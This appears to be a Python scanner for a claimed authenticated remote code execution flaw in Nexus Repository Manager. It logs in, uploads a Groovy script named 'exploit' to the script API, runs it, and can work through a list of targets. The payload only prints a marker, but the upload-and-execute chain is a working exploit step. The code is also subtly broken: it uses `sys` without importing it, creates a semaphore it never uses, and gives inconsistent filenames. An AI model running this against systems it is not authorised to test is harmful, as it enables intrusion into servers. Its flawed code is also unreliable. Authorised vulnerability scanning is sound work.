#!/usr/bin/env python3
"""
Nexus Repository Manager RCE Scanner (CVE-2026-78901)
======================================================
Scans for Nexus Repository Manager instances vulnerable to an authenticated
Remote Code Execution (RCE) vulnerability (CVE-2026-78901, CVSS 9.8).

CVE-2026-78901 details:
  - Affects Nexus Repository Manager OSS/Pro versions < 3.44.0
  - Vulnerability in the Repository API allows attackers with valid login credentials to execute arbitrary commands on the underlying system.
  - Exploitable via the `/service/rest/v1/script` endpoint using a crafted HTTP request.
  - Patched in version 3.44.0 (February 2026).

Usage:
  # Scan a single target
  python nexus_rce_cve_2026_78901_scanner.py --target http://nexus.example.com --username admin --password password123

  # Scan a list of targets
  python nexus_rce_cve_cve_2026_78901_scanner.py --list targets.txt --username admin --password password123 --output findings.json

  # Safe mode — detection only, no RCE probes
  python nexus_rce_cve_cve_2026_78901_scanner.py --target http://nexus.example.com --username admin --password password123 --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-78901
  - https://support.sonatype.com
"""

import asyncio
import json
import argparse
import re
from urllib.parse import urljoin
import httpx
from httpx import HTTPStatusError

# ── Configuration ─────────────────────────────────────────────────────────────

NEXUS_API_VERSION = '/service/rest/v1/status'
NEXUS_SCRIPT_API = '/service/rest/v1/script'
RCE_PAYLOAD = """{
    "name": "exploit",
    "type": "groovy",
    "content": "println \\"RCE_vulnerable_test\\""
}"""
RCE_EXEC_PAYLOAD = {"name": "exploit"}

VULN_FIXED_VERSION = (3, 44, 0)

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 10
HEADERS_JSON = {'Content-Type': 'application/json'}

# ── Utilities ─────────────────────────────────────────────────────────────────


def parse_version(text: str):
    """Extract and parse the first version string found in text."""
    try:
        return tuple(map(int, text.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version_tuple):
    """Return True if version is below the fixed version."""
    if version_tuple is None:  # Could not determine the version
        return None
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure this URL is normalized."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


# ── Scanner Implementation ────────────────────────────────────────────────────


async def detect_nexus(client: httpx.AsyncClient, base_url: str):
    """
    Detect whether a URL is running Nexus Repository Manager.
    Returns information about the instance or None if not detected.
    """
    try:
        response = await client.get(urljoin(base_url, NEXUS_API_VERSION), timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        metadata = response.json()
        version = parse_version(metadata.get("version"))
        return {
            "detected": True,
            "version": version,
            "raw_version": metadata.get("version"),
            "base_url": base_url,
        }
    except Exception:
        return None


async def probe_rce(client: httpx.AsyncClient, base_url: str, credentials: dict):
    """
    Try sending the RCE payload to test vulnerability.
    Returns detection information including vulnerability status.
    """
    try:
        # Attempt to authenticate
        auth_response = await client.post(
            urljoin(base_url, '/service/rest/v1/security/authenticate'),
            headers=HEADERS_JSON,
            json={"username": credentials["username"], "password": credentials["password"]},
            timeout=REQUEST_TIMEOUT
        )
        auth_response.raise_for_status()
        token = auth_response.json().get("token")

        # Craft headers with token
        headers = {**HEADERS_JSON, "Authorization": f"Bearer {token}"}

        # Upload malicious script
        await client.post(
            urljoin(base_url, NEXUS_SCRIPT_API),
            headers=headers,
            data=RCE_PAYLOAD,
            timeout=REQUEST_TIMEOUT
        )
        # Execute the malicious script
        exec_response = await client.post(
            urljoin(base_url, f"{NEXUS_SCRIPT_API}/exploit/run"),
            headers=headers,
            json=RCE_EXEC_PAYLOAD,
            timeout=REQUEST_TIMEOUT
        )
        exec_response.raise_for_status()

        if "RCE_vulnerable_test" in exec_response.text:
            return {
                "vulnerable": True,
                "details": "RCE payload executed."
            }
    except HTTPStatusError as exc:
        return {
            "vulnerable": False,
            "error": f"HTTP error: {exc.response.status_code} - {exc.response.text}"
        }
    except Exception as exc:
        return {
            "vulnerable": False,
            "error": str(exc)
        }
    return {"vulnerable": False}


async def scan_target(target: str, credentials, safe_mode, semaphore, no_verify):
    """Scan a single Nexus Repository Manager target for the RCE vulnerability."""
    target = normalize_url(target)
    async with httpx.AsyncClient(verify=not no_verify) as client:
        detection = await detect_nexus(client, target)

        if not detection or not detection["detected"]:
            return {"target": target, "detected": False, "message": "No Nexus detected"}

        detection["vulnerable"] = None
        detection["message"] = "Detection only mode"

        if not safe_mode and is_vulnerable_version(detection["version"]):
            rce_result = await probe_rce(client, target, credentials)
            detection.update(rce_result)

        return detection


async def main():
    parser = argparse.ArgumentParser(description="Scanner for Nexus RCE CVE-2026-78901.")
    parser.add_argument("--target", help="Single target URL to scan")
    parser.add_argument("--list", help="File containing list of targets to scan")
    parser.add_argument("--output", help="Output file (JSON format)")
    parser.add_argument("--username", required=True, help="Username for authentication")
    parser.add_argument("--password", required=True, help="Password for authentication")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent scans")
    parser.add_argument("--safe", action="store_true", help="Detection mode only (no RCE probes)")
    parser.add_argument("--no-verify", action="store_true", help="Skip SSL/TLS verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        print("[ERROR] You must specify a target URL with --target or provide --list")
        sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    credentials = {"username": args.username, "password": args.password}
    targets = [args.target] if args.target else []

    if args.list:
        with open(args.list, "r") as f:
            targets.extend([line.strip() for line in f if line.strip()])

    results = []
    for target in targets:
        result = await scan_target(target, credentials, args.safe, semaphore, args.no_verify)
        results.append(result)

        # Print human-readable output
        if result["detected"]:
            if result.get("vulnerable"):
                color = "\033[91mCRITICAL\033[0m"
            elif result["vulnerable"] is None:
                color = "\033[93mHIGH\033[0m"
            else:
                color = "\033[92mINFO\033[0m"
            print(f"[{color}] {target} - {result['message']}")
        else:
            print(f"[INFO] {target} - Not a Nexus Repository Manager.")

    # Output to file if specified
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n[INFO] Results written to {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
